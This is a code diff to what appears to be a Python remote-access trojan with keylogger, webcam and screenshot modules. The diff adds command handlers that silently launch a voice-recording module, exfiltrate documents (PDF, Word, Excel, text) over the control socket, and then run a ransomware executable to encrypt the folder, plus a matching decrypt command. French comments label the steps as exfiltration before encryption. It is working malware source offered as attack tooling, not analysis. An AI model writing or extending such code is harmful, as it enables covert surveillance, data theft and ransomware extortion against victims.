@@ -37,6 +37,7 @@ if IS_WINDOWS:
     REMOTE_EXE = os.path.join(BASE_DIR, "remote.exe")
     SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
     VOICE_EXE = os.path.join(BASE_DIR, "voice_module.exe")
+    RANSOMWARE_EXE = os.path.join(BASE_DIR, "ransom.exe")
 else:
     KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger_linux")
     WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam")
@@ -203,6 +204,26 @@ def handle_commands(client_socket):
                     if wait_for_file(latest):
                         send_file(client_socket, latest, "screenshot")
                         os.remove(latest)
+
+            elif command == "voice":
+                subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+
+            elif command.startswith("encrypt:"):
+                folder = command.split(":", 1)[1]
+
+                # Étape 1 : Exfiltrer les fichiers ciblés avant chiffrement
+                for root, _, files in os.walk(folder):
+                    for file in files:
+                        if file.lower().endswith((".pdf", ".txt", ".docx", ".xls", ".xlsx")):
+                            file_path = os.path.join(root, file)
+                            exfiltrate_file(file_path, client_socket)
+
+                # Étape 2 : Lancer le ransomware pour chiffrer
+                subprocess.Popen([RANSOMWARE_EXE, "encrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)
+
+            elif command.startswith("decrypt:"):
+                folder = command.split(":", 1)[1]
+                subprocess.Popen([RANSOMWARE_EXE, "decrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)
 
 
             # elif command == "voice":
